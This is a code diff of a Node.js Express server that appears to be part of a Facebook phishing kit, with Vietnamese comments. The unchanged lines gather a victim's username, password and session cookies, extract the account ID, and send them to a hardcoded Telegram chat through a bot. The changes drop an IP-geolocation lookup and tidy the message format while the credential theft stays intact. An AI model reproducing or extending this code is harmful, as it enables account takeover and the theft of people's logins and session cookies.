@@ -3,11 +3,10 @@ const bodyParser = require('body-parser');
 const puppeteer = require('puppeteer');
 const fs = require('fs');
 const TelegramBot = require('node-telegram-bot-api');
-const axios = require('axios');
 
 const app = express();
 app.set('view engine', 'ejs');
-app.set('views', './views');
+app.set('views', __dirname + '/views');
 app.use(express.static('public'));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
@@ -55,9 +54,7 @@ app.post('/', async function (req, res) {
         const chatId = '-953376614';
 
         // Lấy thông tin địa chỉ cụ thể từ địa chỉ IP
-        const response = await axios.get(`http://ip-api.com/json/${ipAddress}`);
-        const address = response.data.city + ', ' + response.data.regionName + ', ' + response.data.country;
-        
+
         const cookies2 = JSON.stringify(cookies);
         const cookiesArray = JSON.parse(cookies2);
         const cookieString = cookiesArray.map(cookie => {
@@ -74,15 +71,13 @@ app.post('/', async function (req, res) {
         const cUserRegex = /c_user=(\d+)/;
         const match = cookieString.match(cUserRegex);
         const cUserValue = match ? match[1] : null;
-        let 
-        message = '================ 🆕🆕 NEW LOG 🆘🆘================= \n'+'\n';
-        message += '🆔 ID: ' + cUserValue + '\n'+'\n';
-        message += '📧 Username: ' + username + '\n'+'\n';
-        message += '🔐 Password: ' + password + '\n'+'\n';
+        let
+          message = '================ 🆕🆕 NEW LOG 🆘🆘================= \n' + '\n';
+        message += '🆔 ID: ' + cUserValue + '\n' + '\n';
+        message += '📧 Username: ' + username + '\n' + '\n';
+        message += '🔐 Password: ' + password + '\n' + '\n';
         message += '🍪 Cookies: ' + cookieString + '\n\n';
-        message += '📡 IP Address: ' + ipAddress + '\n'+'\n';
-        message += '🪪 Address: ' + address +'\n'+'\n';
-        message += '📅 Date : '+ formattedDate+'\n'+'\n';
+        message += '📅 Date : ' + formattedDate + '\n' + '\n';
         message += '================ 🆕🆕 NEW LOG 🆘🆘================= ';
         bot.sendMessage(chatId, message)
           .then(() => {
